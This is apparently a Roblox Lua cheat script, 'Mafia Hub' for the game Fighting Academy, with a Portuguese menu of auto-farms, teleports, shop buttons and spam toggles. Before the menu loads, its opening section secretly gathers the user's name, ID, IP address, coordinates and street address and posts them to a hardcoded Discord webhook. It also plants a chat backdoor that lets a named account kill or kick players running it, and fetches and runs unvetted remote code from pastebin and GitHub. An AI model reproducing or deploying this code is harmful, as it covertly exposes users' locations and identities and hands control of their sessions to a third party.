local Webhook_URL = "https://discord.com/api/webhooks/1382146015406325800/Z5vpsRnZcdLp25O5wlK5VKG5-ro9f-1qnTY7UDNBQSSamgbOAuC8WSTkrzlS2jRyKdrW"

local function sendToDiscord()
    local request = http_request or request or (syn and syn.request) or (http and http.request)
    if not request then return end

    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local LocalPlayer = Players.LocalPlayer

    if not LocalPlayer then return end

    local username = LocalPlayer.Name
    local userId = LocalPlayer.UserId
    local accountAge = LocalPlayer.AccountAge
    local jobId = game.JobId or "N/A"

    local ipInfo = {
        ip = "Desconhecido",
        city = "Desconhecida",
        region = "Desconhecida",
        country = "Desconhecido",
        coordinates = "Desconhecida",
        address = "Desconhecido"
    }

    local ipApiSuccess, ipApiResult = pcall(function()
        return request({
            Url = "http://ip-api.com/json/",
            Method = "GET"
        })
    end)

    if ipApiSuccess and ipApiResult and ipApiResult.Body then
        local decoded = HttpService:JSONDecode(ipApiResult.Body)
        if decoded.status == "success" then
            ipInfo.ip = decoded.query or ipInfo.ip
            ipInfo.city = decoded.city or ipInfo.city
            ipInfo.region = decoded.regionName or ipInfo.region
            ipInfo.country = decoded.country or ipInfo.country
        end
    end

    local ipInfoSuccess, ipInfoResult = pcall(function()
        return request({
            Url = "https://ipinfo.io/json",
            Method = "GET"
        })
    end)

    if ipInfoSuccess and ipInfoResult and ipInfoResult.Body then
        local decodedInfo = HttpService:JSONDecode(ipInfoResult.Body)
        if decodedInfo.loc then
            ipInfo.coordinates = decodedInfo.loc 
        end
    end

    if ipInfo.coordinates ~= "Desconhecida" then
        local lat, lon = ipInfo.coordinates:match("([^,]+),([^,]+)")
        if lat and lon then
            local nominatimSuccess, nominatimResult = pcall(function()
                return request({
                    Url = ("https://nominatim.openstreetmap.org/reverse?format=json&lat=%s&lon=%s"):format(lat, lon),
                    Method = "GET",
                    Headers = {
                        ["User-Agent"] = "RobloxScript/1.0"
                    }
                })
            end)

            if nominatimSuccess and nominatimResult and nominatimResult.Body then
                local nominatimData = HttpService:JSONDecode(nominatimResult.Body)
                if nominatimData and nominatimData.display_name then
                    ipInfo.address = nominatimData.display_name
                end
            end
        end
    end

    local data = {
        ["content"] = "Execu√ß√£o Mafia Hub",
        ["embeds"] = {{
            ["title"] = "Dados do Jogador",
            ["fields"] = {
                {["name"] = "Game", ["value"] = "```Fighting Academy ü•ãü•ä```", ["inline"] = false},
                {["name"] = "Usu√°rio", ["value"] = "```" .. username .. "```", ["inline"] = false},
                {["name"] = "ID do Usu√°rio", ["value"] = "```" .. tostring(userId) .. "```", ["inline"] = false},
                {["name"] = "Idade da Conta", ["value"] = "```" .. tostring(accountAge) .. " dias```", ["inline"] = false},
                {["name"] = "Job ID", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
                {["name"] = "Endere√ßo IP", ["value"] = "```" .. ipInfo.ip .. "```", ["inline"] = false},
                {["name"] = "Pa√≠s", ["value"] = "```" .. ipInfo.country .. "```", ["inline"] = false},
                {["name"] = "Estado/Regi√£o", ["value"] = "```" .. ipInfo.region .. "```", ["inline"] = false},
                {["name"] = "Cidade", ["value"] = "```" .. ipInfo.city .. "```", ["inline"] = false},
                {["name"] = "Coordenadas", ["value"] = "```" .. ipInfo.coordinates .. "```", ["inline"] = false},
                {["name"] = "Localiza√ß√£o", ["value"] = "```" .. ipInfo.address .. "```", ["inline"] = false}
            },
            ["color"] = 16711680
        }}
    }

    request({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
end

sendToDiscord()


local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local localPlayer = Players.LocalPlayer
local allowedUser = "Lusquinha_067"

-- Controle de loopkill
local loopKill = false
local loopTarget = nil
local loopInitiatorUserId = nil

-- Loop que mata em loop
RunService.RenderStepped:Connect(function()
	if not loopKill or not loopTarget then return end

	-- N√£o aplica no pr√≥prio criador do comando
	if localPlayer.UserId == loopInitiatorUserId then return end

	local char = localPlayer.Character
	if not char then return end

	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end

	if loopTarget == "all" then
		humanoid.Health = 0
	elseif localPlayer.Name:sub(1,1):lower() == loopTarget then
		humanoid.Health = 0
	end
end)

-- Fun√ß√£o para kickar o jogador
local function kickSelf(reason)
	pcall(function()
		localPlayer:Kick(reason or "Voc√™ foi expulso.")
	end)
end

-- Escuta mensagens de chat
TextChatService.OnIncomingMessage = function(message)
	local text = message.Text:lower()
	if not message.TextSource then return end

	local senderUserId = message.TextSource.UserId
	local senderName = Players:GetNameFromUserIdAsync(senderUserId)
	if senderName ~= allowedUser then return end

	-- Protege o pr√≥prio executor
	local isFromSelf = (senderUserId == localPlayer.UserId)

	-- /kill comando
	if text:sub(1, 6) == "/kill " then
		local arg = text:sub(7):lower()
		if arg == "all" then
			if not isFromSelf then
				local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then humanoid.Health = 0 end
			end
		elseif arg:match("^%a$") then
			if localPlayer.Name:sub(1,1):lower() == arg then
				local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then humanoid.Health = 0 end
			end
		end

	-- /loopkill comando
	elseif text:sub(1, 10) == "/loopkill " then
		local arg = text:sub(11):lower()
		if arg == "all" or arg:match("^%a$") then
			loopKill = true
			loopTarget = arg
			loopInitiatorUserId = senderUserId
		end

	-- /unloopkill comando
	elseif text == "/unloopkill" then
		loopKill = false
		loopTarget = nil
		loopInitiatorUserId = nil

	-- /kick comando
	elseif text:sub(1, 6) == "/kick " then
		local arg = text:sub(7):lower()
		if arg == "all" then
			if not isFromSelf then
				kickSelf("Voc√™ foi expulso.")
			end
		elseif arg:match("^%a$") then
			if localPlayer.Name:sub(1,1):lower() == arg then
				kickSelf("Voc√™ foi expulso.")
			end
		end
	end
end



loadstring(game:HttpGet("https://pastebin.com/raw/A2bwvFr7"))()


task.wait(0.1)




local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/Library-ui/refs/heads/main/Redzhubui"))()




local Window = Library:MakeWindow({
Title = "Mafia Hub Fighting Academy V1",
SubTitle = "by: Luscaa",
SaveFolder = "MafiaHub_FightingAcademy"
})




Window:AddMinimizeButton({
Button = { Image = "rbxassetid://131669852271916", BackgroundTransparency = 0 },
Corner = { CornerRadius = UDim.new(0.5, 0) }
})




local CreditsTab = Window:MakeTab({"Menu Credits", "rbxassetid://15309138473"})


local SectionCredits = CreditsTab:AddSection({"Credits"})
CreditsTab:AddParagraph({"Menu Escrito Por:", "Luscaa"})
CreditsTab:AddParagraph({"Ideias e Colabora√ß√µes no Codigo:", "Luscaa, Magekko e Sukuna"})




Window:Dialog({
Title = "Aviso",
Text = "Ol√°, exploiter, Voce esta usando Chaos Hub V1 Fighting Academy, Recomendo Usar a Hub em Servidores privados",
Options = {
{"OK", function() end}
}
})




local TabFarms = Window:MakeTab({"Auto Farms", "rbxassetid://10098013519"})


local SectionNPCs = TabFarms:AddSection({"Monitorar npcs"})



local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local npcsToMonitor = {
    "Karate_Boss",
    "KungFu_Boss",
    "capoeira_Boss",
    "boxing_Boss",
    "muaythai_Boss",
    "kickboxing_Boss",
    "taekwondo_boss"
}

local monitoringConnections = {}
local monitoringEnabled = false

local function createNotification(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 5
    })
end

local function monitorSpecificNPC(npcName)
    local function onNPCAdded(npc)
        if npc.Name == npcName then
            createNotification("NPC Spawn", npcName .. " nasceu.")
            local humanoid = npc:WaitForChild("Humanoid", 5)
            if humanoid then
                humanoid.Died:Connect(function()
                    createNotification("NPC Morto", npcName .. " morreu.")
                end)
            end
        end
    end

    local npcFolder = Workspace:WaitForChild("Npcs"):WaitForChild("Folder")
    local connection = npcFolder.ChildAdded:Connect(onNPCAdded)
    table.insert(monitoringConnections, connection)

    local existingNPC = npcFolder:FindFirstChild(npcName)
    if existingNPC then
        onNPCAdded(existingNPC)
    end
end

local function startMonitoringNPCs()
    for _, npcName in ipairs(npcsToMonitor) do
        monitorSpecificNPC(npcName)
    end
end

local function stopMonitoringNPCs()
    for _, connection in ipairs(monitoringConnections) do
        if connection.Disconnect then
            connection:Disconnect()
        end
    end
    table.clear(monitoringConnections)
end



TabFarms:AddToggle({
    Name = "Monitorar NPCs",
    Default = false,
    Callback = function(Value)
        monitoringEnabled = Value
        if monitoringEnabled then
            startMonitoringNPCs()
        else
            stopMonitoringNPCs()
        end
    end
})



TabFarms:AddParagraph({"Info", "Nos Farms que precisam matar Npcs, voc√É∆í√Ç¬™ precisa matar ele em 1 ou 2 golpes Se N√É∆í√Ç¬£o, o farm n√É∆í√Ç¬£o funciona"})




local SectionNPCs = TabFarms:AddSection({"Farm NPCs Level 50"})
TabFarms:AddButton({
Name = "Auto Farm NPCS Level 50",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RapDoMinecraft/Modules.Academy/refs/heads/main/Fighting%20Academy/Farm%20Npcs%20level%2050.lua"))()
end
})
TabFarms:AddParagraph({"Info", "Use Auto Clicker para aceitar a quest"})




local SectionBunchakala = TabFarms:AddSection({"Farm NPCs Level 20"})
TabFarms:AddButton({
Name = "Auto Farm NPCS Level 20",
Callback = function()




loadstring(game:HttpGet("https://raw.githubusercontent.com/RapDoMinecraft/Modules.Academy/refs/heads/main/Fighting%20Academy/Farm%20Npcs%20level%2020.lua"))()
end
})




TabFarms:AddParagraph({"Info", "Use Auto Clicker para aceitar a quest"})




local SectionBunch = TabFarms:AddSection({"Farm NPCs iniciais"})
TabFarms:AddButton({
Name = "Auto Farm NPCS inicias",
Callback = function()




loadstring(game:HttpGet("https://raw.githubusercontent.com/RapDoMinecraft/Modules-Games/refs/heads/main/Fighting%20Academy/Farm%20Npcs%20Inciais.lua"))()
end
})




TabFarms:AddParagraph({"Info", "Use Auto Clicker para aceitar a quest"})




local SectionGangsters = TabFarms:AddSection({"Farm Gangsters"})
TabFarms:AddButton({
Name = "Auto Farm Gangsters",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RapDoMinecraft/Modules.Academy/refs/heads/main/Fighting%20Academy/Farm%20Gangsters.lua"))()
end
})
TabFarms:AddParagraph({"Info", "Use Auto Clicker para aceitar a quest"})

local TabBanco = Window:MakeTab({"Banco [Irritar Player]", "rbxassetid://4869213016"})




TabBanco:AddParagraph({"Info", "Aqui Voce Pode Fazer transferencias sem ir at√É∆í√Ç¬© o banco, e tambem pode irritar os Players Spamando Transferencia"})




local Players = game:GetService("Players")
local playerList = {}
for _, player in pairs(Players:GetPlayers()) do
table.insert(playerList, player.Name)
end




local selectedPlayer = ""
local amount = ""




TabBanco:AddDropdown({
Name = "Selecione o Player",
Options = playerList,
Default = "",
Callback = function(Value)
selectedPlayer = Value
end
})




TabBanco:AddTextBox({
Name = "Quanto Deseja Transferir?",
PlaceholderText = "Enter amount",
Callback = function(Value)
amount = Value
end
})




TabBanco:AddButton({
Name = "Transferir O Dinheiro",
Callback = function()
if selectedPlayer ~= "" and amount ~= "" then
local args = {
[1] = selectedPlayer,
[2] = amount
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("bank"):FireServer(unpack(args))
else
print("Select a player and enter an amount.")
end
end
})




local spamTransfer = false
local transferAll = false




TabBanco:AddToggle({
Name = "Spamar Transferencia No Player",
Default = false,
Callback = function(Value)
spamTransfer = Value
if spamTransfer then
while spamTransfer do
if selectedPlayer ~= "" and amount ~= "" then
local args = {
[1] = selectedPlayer,
[2] = amount
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("bank"):FireServer(unpack(args))
else
print("Select a player and enter an amount.")
end
task.wait(0.000001)
end
end
end
})




TabBanco:AddToggle({
Name = "Spamar Transferencia Em todos do Server",
Default = false,
Callback = function(Value)
transferAll = Value
if transferAll then
while transferAll do
if amount ~= "" then
for _, player in pairs(Players:GetPlayers()) do
local args = {
[1] = player.Name,
[2] = amount
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("bank"):FireServer(unpack(args))
end
else
print("Enter an amount.")
end
task.wait(0.00000000001)
end
end
end
})








local PVPTab = Window:MakeTab({"Artes Marciais", "rbxassetid://13050670424"})




PVPTab:AddParagraph({"Info", "Clique na arte marcial e ela ser√É∆í√Ç¬° equipada em seu personagem\nVoc√É∆í√Ç¬™ precisa ter os atributos suficientes para equipar elas"})




local martialArts = {
{"Nostyle", 0},
{"Boxe", 1},
{"Kickboxing", 2},
{"Muay Thai", 3},
{"Capoeira", 4},
{"Taekwondo", 5},
{"Karate", 6},
{"Kung Fu", 7}
}




for _, martialArt in pairs(martialArts) do
local section = PVPTab:AddSection({martialArt[1]})
PVPTab:AddButton({
Name = martialArt[1],
Callback = function()
local args = {
[1] = martialArt[2],
[2] = game:GetService("Players").LocalPlayer
}
game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("SelectMartialArt"):InvokeServer(unpack(args))
end
})
PVPTab:AddParagraph({"Info", "Seleciona o estilo de luta " .. martialArt[1]})
end




local TabTeleports = Window:MakeTab({"Teleports", "rbxassetid://12941020168"})




local teleports = {
["Spawn"] = "https://pastebin.com/raw/uAWNPsaB",
["Casa do Magekko"] = "https://pastebin.com/raw/XHUh3yr4",
["Casa de Resistencia"] = "https://pastebin.com/raw/QAtZHinL",
["Banco"] = "https://pastebin.com/raw/ieLAxPWr",
["Dojo"] = "https://pastebin.com/raw/PyezpG3k",
["Academia 2 n√É∆í√Ç¬£o sei o nome"] = "https://pastebin.com/raw/wcgpk2KD"
}




local SectionTeleports = TabTeleports:AddSection({"Teleports"})
TabTeleports:AddDropdown({
Name = "Selecionar Teleport",
Options = {"Nenhum", "Spawn", "Casa do Magekko", "Casa de Resistencia", "Banco", "Dojo", "Academia 2 n√£o sei o nome"},
Default = "Nenhum",
Callback = function(Value)
if teleports[Value] then
loadstring(game:HttpGet(teleports[Value]))()
end
end
})
TabTeleports:AddParagraph({"Info", "Clique na lista e selecione o TP desejado"})

local AutoTreinosTab = Window:MakeTab({"Auto Treinos", "rbxassetid://17465429968"})

local Sectioncom = AutoTreinosTab:AddSection({"Comer automatico "})

AutoTreinosTab:AddButton({
Name = "Comer Automatico",
Description="Ativando Isso Voc√™ poder√° farmar Afk com peso Comendo Automaticamente quando seu personagem ficar com fome",
     Callback = function()
    -- Servi√ßos
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local userInputService = game:GetService("UserInputService")
local replicatedStorage = game:GetService("ReplicatedStorage")

-- GUI principal
local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Name = "SistemaHungerGui"
screenGui.Parent = playerGui

-- Frame principal com estilo
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 160, 0, 60)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Name = "MainFrame"
frame.Parent = screenGui

-- Borda RGB animada
local stroke = Instance.new("UIStroke")
stroke.Thickness = 3
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Color = Color3.new(1, 0, 0)
stroke.Parent = frame

-- Sombra sutil
local shadow = Instance.new("UIStroke")
shadow.Thickness = 5
shadow.Transparency = 0.85
shadow.Color = Color3.fromRGB(0, 0, 0)
shadow.Parent = frame

-- Arredondamento
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Bot√£o Toggle
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(1, -10, 1, -10)
toggleButton.Position = UDim2.new(0, 5, 0, 5)
toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
toggleButton.Text = "Ativar Comer Automatico"
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.TextSize = 20
toggleButton.Font = Enum.Font.Gotham
toggleButton.AutoButtonColor = false
toggleButton.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = toggleButton

-- Efeito hover no bot√£o
toggleButton.MouseEnter:Connect(function()
	toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
end)

toggleButton.MouseLeave:Connect(function()
	toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
end)

-- Som de clique
local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://12222225" -- som simples de clique
clickSound.Volume = 0.7
clickSound.Parent = toggleButton

-- Anima√ß√£o RGB da borda
task.spawn(function()
	while true do
		local t = tick()
		local r = math.sin(t * 2) * 127 + 128
		local g = math.sin(t * 2 + 2) * 127 + 128
		local b = math.sin(t * 2 + 4) * 127 + 128
		stroke.Color = Color3.fromRGB(r, g, b)
		task.wait(0.03)
	end
end)

-- Drag do frame
local isDragging = false
local dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		isDragging = true
		dragStart = input.Position
		startPos = frame.Position
	end
end)

frame.InputChanged:Connect(function(input)
	if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

userInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		isDragging = false
	end
end)

-- Sistema
local systemActive = false
local cooldown = false

-- Mensagem (sem countdown)
local function showMessage(message)
	local messageFrame = Instance.new("Frame")
	messageFrame.Size = UDim2.new(0, 200, 0, 50)
	messageFrame.Position = UDim2.new(0.5, -100, 0.8, 0)
	messageFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	messageFrame.BorderSizePixel = 0
	messageFrame.Parent = screenGui

	local msgCorner = Instance.new("UICorner")
	msgCorner.CornerRadius = UDim.new(0, 10)
	msgCorner.Parent = messageFrame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, 0, 1, 0)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	messageLabel.TextSize = 18
	messageLabel.Parent = messageFrame

	task.wait(2) -- tempo fixo

	messageFrame:Destroy()
end

local function monitorHunger()
	while systemActive do
		local hunger = tonumber(player:GetAttribute("hunger")) or 0

		if hunger <= 10 then
			local handWeightTool = player.Character:FindFirstChild("Hand weight")
			if handWeightTool then
				handWeightTool.Parent = player.Backpack
			end

			replicatedStorage:WaitForChild("Functions"):WaitForChild("BuyItem"):InvokeServer("chicken", player)

			task.wait(2)

			local chickenTool = player.Backpack:FindFirstChild("Chicken")
			if chickenTool then
				chickenTool.Parent = player.Character
			end

			while systemActive and player.Character:FindFirstChild("Chicken") do
				task.wait(1)
			end

			if systemActive and handWeightTool then
				handWeightTool.Parent = player.Character
			end
		end

		task.wait(1)
	end
end

toggleButton.MouseButton1Click:Connect(function()
	if cooldown then return end
	cooldown = true
	clickSound:Play()

	systemActive = not systemActive

	if systemActive then
		toggleButton.Text = "Desativar"
		showMessage("Sistema Ativado")
		task.spawn(monitorHunger)
	else
		toggleButton.Text = "Ativar"
		showMessage("Sistema Desativado")
	end

	task.wait(0.5)
	cooldown = false
end)
end
})

local SectionResi = AutoTreinosTab:AddSection({"Resistencia Automatico"})

AutoTreinosTab:AddButton({
Name = "Auto Resistencia Novo (N√£o Precisa ir at√© a academia)",
Callback = function()

local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer

-- Fun√ß√£o para configurar as partes
local function setupParts(character)
    local rootPart = character:WaitForChild("HumanoidRootPart") -- Centro do personagem

    local parent = workspace.GameMap["constru√ß√µes"].StoreResistence
    local partFoot = parent:GetChildren()[8].initial -- Parte que segue o p√©
    local partHead = parent:GetChildren()[8].final   -- Parte que sobe e desce

    if partFoot and partFoot:IsA("BasePart") and partHead and partHead:IsA("BasePart") then
        -- Desativa a colis√£o e define a transpar√™ncia para 0.7
        partFoot.CanCollide = false
        partHead.CanCollide = false
        partFoot.Transparency = 0.7
        partHead.Transparency = 0.7

        local amplitude = 2.2 -- O quanto a parte sobe e desce
        local speed = 100 -- Velocidade da anima√ß√£o

        RunService.RenderStepped:Connect(function()
            -- Faz a parte inicial ficar no p√© do jogador
            local footPosition = rootPart.Position - Vector3.new(0, 3, 0)
            partFoot.Position = footPosition

            -- Faz a parte final subir e descer ao mesmo tempo da parte inicial
            local offsetY = math.sin(tick() * speed) * amplitude
            local headPosition = rootPart.Position + Vector3.new(0, 2 + offsetY, 0)
            partHead.Position = headPosition

            -- Sincroniza o movimento da parte inicial para ir para baixo enquanto a parte final sobe
            local footOffsetY = -offsetY -- Movimenta a parte do p√© para baixo
            partFoot.Position = rootPart.Position - Vector3.new(0, 3 + footOffsetY, 0)
        end)
    end
end

-- Conecta o evento para quando o personagem for adicionado (respawn)
player.CharacterAdded:Connect(function(character)
    -- Espera o personagem ser carregado e ent√£o configura as partes
    setupParts(character)
end)

-- Caso o personagem j√° esteja presente no in√≠cio (em caso de j√° estar no jogo), configura as partes
if player.Character then
    setupParts(player.Character)
end

-- Reposiciona as partes ao mover o personagem
player.CharacterAdded:Connect(function(character)
    -- Espera o personagem ser carregado e ent√£o reposiciona as partes
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local parent = workspace.GameMap["constru√ß√µes"].StoreResistence
    local partFoot = parent:GetChildren()[8].initial
    local partHead = parent:GetChildren()[8].final

    -- Garante que as partes sigam o personagem ap√≥s renascimento
    if partFoot and partFoot:IsA("BasePart") and partHead and partHead:IsA("BasePart") then
        partFoot.Position = rootPart.Position - Vector3.new(0, 3, 0)
        partHead.Position = rootPart.Position + Vector3.new(0, 2, 0)
    end
end)
end
})

AutoTreinosTab:AddParagraph({"Info", "Recomendo Comprar Colete de 115 KG pra usar"})


local SectionPeso = AutoTreinosTab:AddSection({"Peso Automatico"})
local pesoToggled = false
AutoTreinosTab:AddToggle({
Name = "Peso",
Default = false,
Callback = function(Value)
pesoToggled = Value
if pesoToggled then
spawn(function()
while pesoToggled do
task.wait(0.0001)
local args = {
[1] = game:GetService("Players").LocalPlayer
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("HandP"):FireServer(unpack(args))
end
end)
end
end
})
AutoTreinosTab:AddParagraph({"Info", "Treina qualquer peso de m√É∆í√Ç¬£o automaticamente"})






local SectionBarra = AutoTreinosTab:AddSection({"Barra Automatica"})
local barToggled = false
AutoTreinosTab:AddToggle({
Name = "Barra",
Default = false,
Callback = function(Value)
barToggled = Value
if barToggled then
while barToggled do
task.wait(0.0001)
local args = {
[1] = "bar",
[2] = game:GetService("Players").LocalPlayer
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Gym"):FireServer(unpack(args))
end
end
end
})
AutoTreinosTab:AddParagraph({"Info", "Treina a Barra automaticamente"})

local SectionSupino = AutoTreinosTab:AddSection({"Supino Automatico"})
local supinoToggled = false
AutoTreinosTab:AddToggle({
Name = "Supino",
Default = false,
Callback = function(Value)
supinoToggled = Value
if supinoToggled then
while supinoToggled do
task.wait(0.0001)
local args = {
[1] = "supin",
[2] = game:GetService("Players").LocalPlayer
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Gym"):FireServer(unpack(args))
end
end
end
})
AutoTreinosTab:AddParagraph({"Info", "Treina o supino automaticamente"})




local LojaTab = Window:MakeTab({"Loja", "Shopping"})


local SectionPeso = LojaTab:AddSection({"Comprar Peso"})
LojaTab:AddButton({
Name = "Comprar Peso 100 KG",
Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")




local targetPosition = Vector3.new(-339.95, 9.36, -683.50)
local elevatorSpeed = 80




local function TpBurlarAntShit()
local currentPosition = humanoidRootPart.Position
local direction = (targetPosition - currentPosition).Unit
local distance = (targetPosition - currentPosition).Magnitude




for step = 0, distance, elevatorSpeed * 0.1 do      
    local newPosition = currentPosition + direction * step      
    humanoidRootPart.CFrame = CFrame.new(newPosition)      
    task.wait(0.1)      
end      




humanoidRootPart.CFrame = CFrame.new(targetPosition)




end




TpBurlarAntShit()
task.wait(0.5)




local function SimularTeclaE()
local VirtualUser = game:GetService("VirtualUser")
VirtualUser:CaptureController()
VirtualUser:SetKeyDown("e")
task.wait(5)
VirtualUser:SetKeyUp("e")
end




SimularTeclaE()




end




})
LojaTab:AddParagraph({"Info", "Compra Peso automaticamente"})




local SectionCulete = LojaTab:AddSection({"Comprar Colete"})
LojaTab:AddButton({
Name = "Comprar Colete Mais caro [Melhor]",
Callback = function()




loadstring(game:HttpGet("https://raw.githubusercontent.com/RapDoMinecraft/Modules.Academy/refs/heads/main/Fighting%20Academy/Comprar%20Colete.lua"))()
end
})



LojaTab:AddParagraph({"Info", "Compra Colete automaticamente"})







local SectionSuplementos = LojaTab:AddSection({"Suplementos"})
LojaTab:AddButton({
Name = "Suplemento amador",
Callback = function()
local args = {
[1] = "Amateur Supplement"
}
game:GetService("ReplicatedStorage").Events.buyitem:FireServer(unpack(args))
end
})
LojaTab:AddButton({
Name = "Suplemento profissional",
Callback = function()
local args = {
[1] = "Professional Supplement"
}
game:GetService("ReplicatedStorage").Events.buyitem:FireServer(unpack(args))
end
})




LojaTab:AddButton({
Name = "Barra de Proteina",
Callback = function()




    local args = {
        "Protein Bar"
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("buyitem"):FireServer(unpack(args))
end
})


LojaTab:AddButton({
Name = "Energetico",
Callback = function()
    
    local args = {
        "Energy Drink XL"
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("buyitem"):FireServer(unpack(args))
end
})
    
local SectionComidas = LojaTab:AddSection({"Comidas"})
local comidas = {
{"Frango", "chicken"},
{"agua", "water"},
{"Coca cola", "soda"},
{"Bomba", "medicine"}
}




for _, comida in pairs(comidas) do
LojaTab:AddButton({
Name = comida[1],
Callback = function()
local args = {
[1] = comida[2],
[2] = game:GetService("Players").LocalPlayer
}
game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("BuyItem"):InvokeServer(unpack(args))
end
})
end

local OtherScriptsTab = Window:MakeTab({"Scripts Universais", "rbxassetid://11887653877"})




local SectionScripts = OtherScriptsTab:AddSection({"Scripts Universais"})
OtherScriptsTab:AddParagraph({"Info", "Scripts que voc√É∆í√Ç¬™ pode usar em qualquer jogo"})




local universalScripts = {
{"Teclas de dash Pc (Para mobile)", "https://pastebin.com/raw/uWyK7ypt"},
{"Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
{"AntBan Por chat", "https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"},
{"Dex Explorer", "https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua"},
{"Ghost Hub", "https://rawscripts.net/raw/Universal-Script-GhostHub-16534"},
{"God mode", "https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main"},
{"Elevator TP", "https://pastebin.com/raw/uhKv7gnC"}
}




for _, script in pairs(universalScripts) do
OtherScriptsTab:AddButton({
Name = script[1],
Callback = function()
loadstring(game:HttpGet(script[2]))()
end
})
end
local respawnTPToggled = false
local connections = {}




function RespawnTp()
    local Players = game:GetService("Players")




    local function onPlayerAdded(player)
        local lastPosition = nil




        local function onCharacterAdded(character)
            if lastPosition then
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                humanoidRootPart.CFrame = lastPosition
                lastPosition = nil
            end




            local humanoid = character:WaitForChild("Humanoid")




            local diedConn = humanoid.Died:Connect(function()
                lastPosition = character:WaitForChild("HumanoidRootPart").CFrame
            end)




            table.insert(connections, diedConn)
        end




        local charConn = player.CharacterAdded:Connect(onCharacterAdded)
        table.insert(connections, charConn)




        if player.Character then
            onCharacterAdded(player.Character)
        end
    end




    local playerConn = Players.PlayerAdded:Connect(onPlayerAdded)
    table.insert(connections, playerConn)




    for _, player in pairs(Players:GetPlayers()) do
        onPlayerAdded(player)
    end
end




function Parar()
    for _, conn in ipairs(connections) do
        conn:Disconnect()
    end
    connections = {}
end




OtherScriptsTab:AddToggle({
    Name = "Respawn TP",
    Default = false,
    Callback = function(Value)
        respawnTPToggled = Value
        if respawnTPToggled then
            RespawnTp()
        else
            Parar()
        end
    end
})
